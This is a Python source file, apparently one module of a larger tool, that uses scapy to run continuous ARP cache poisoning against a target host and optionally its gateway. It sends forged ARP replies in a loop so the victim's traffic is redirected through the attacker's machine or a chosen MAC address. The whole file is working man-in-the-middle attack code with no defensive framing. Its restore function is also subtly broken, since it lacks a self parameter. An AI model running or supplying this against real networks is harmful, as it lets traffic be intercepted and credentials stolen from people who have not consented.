from scapy.all import ARP
from scapy.all import Ether
from scapy.all import srp
from scapy.all import send
import time
import threading
import logging

import data_manager

class arpspoof(threading.Thread):

    def __init__(self,setting, targetip, targetmac):
        threading.Thread.__init__(self)
        
        self.poision_gateway = setting.poision_gateway
        self.gateway_ip = setting.gateway_ip
        self.gateway_mac = setting.gateway_mac
        self.this_pc_mac = setting.this_pc_mac
        self.hwsrc = setting.hwsrc
        self.time_interval = setting.time_interval

        self.target_ip = targetip
        self.target_mac = targetmac
        self.running = True
        
    @staticmethod
    def getmac(targetip):
        targetmac = ""
        try:
            arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
            targetmac= srp(arppacket,timeout=2 , verbose= False)[0][0][1].hwsrc
            return targetmac
        except IndexError:
            logging.error('arp who-is failed')
            return targetmac

    def spoofarpcache(self, targetip, targetmac, sourceip, sourcemac=None):
        if sourcemac == None:
            spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
        else:
            spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwsrc=sourcemac, hwdst= targetmac)
        send(spoofed, verbose= False)

    def restorearp(targetip, targetmac, sourceip, sourcemac):
        logging.info('restoring arp cache poisioned devices')
        packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
        send(packet, verbose=False)

    def run(self):
        logging.info('starting arp poision')
        logging.info(f'sending packets with {self.time_interval}sec interval.')
        while self.running:
            if self.hwsrc == None:
                # is-at field of arp will be this_pc_mac, and packets destined for the gateway will
                # insted be routed to this pc
                self.spoofarpcache(self.target_ip, self.target_mac, self.gateway_ip)
                if self.poision_gateway:
                    self.spoofarpcache(self.gateway_ip, self.gateway_mac, self.target_ip)
            else:
                # arp poisioned client will assume the owner of the macaddr self.hwsrc as the gateway
                self.spoofarpcache(self.target_ip, self.target_mac, self.gateway_ip, sourcemac=self.hwsrc)
                if self.poision_gateway:
                    self.spoofarpcache(self.gateway_ip, self.gateway_mac, self.target_ip, sourcemac=self.hwsrc)
            print('arp sent to ',self.target_ip)
            time.sleep(self.time_interval)
        logging.info('arp poision stoped')